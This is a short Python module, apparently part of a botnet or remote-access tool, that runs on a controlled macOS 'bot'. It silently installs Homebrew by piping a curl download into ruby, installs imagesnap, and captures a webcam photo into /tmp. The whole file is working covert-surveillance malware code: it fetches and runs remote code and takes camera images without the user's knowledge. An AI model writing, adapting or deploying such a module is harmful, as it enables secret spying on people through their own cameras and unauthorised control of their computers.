'''
NAME: Webcam Picture
DESCRIPTION: Takes webcam image and saves image to bot's /tmp folder with a date-time stamp
'''

import os
import subprocess
import datetime
import sys

'''Takes webcam image and saves image to bot's /tmp folder with a date-time stamp
    Note: installing brew may seem extreme, but ideally we would like all bots to end up with brew at some point'''

if os.system('which -s brew') != 0:
    # user does not have brew, must install
    os.system('ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"')

if os.system('which -s imagesnap') != 0:
    # user does not have imagesnap, must install
    os.system('brew install imagesnap')

# take image and save it in tmp, then respond with output
proc = subprocess.Popen(['imagesnap', '/tmp/image-{}.png'.format(datetime.datetime.now())],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
(out, err) = proc.communicate()

sys.stderr.write(err)
sys.stdout.write(out)
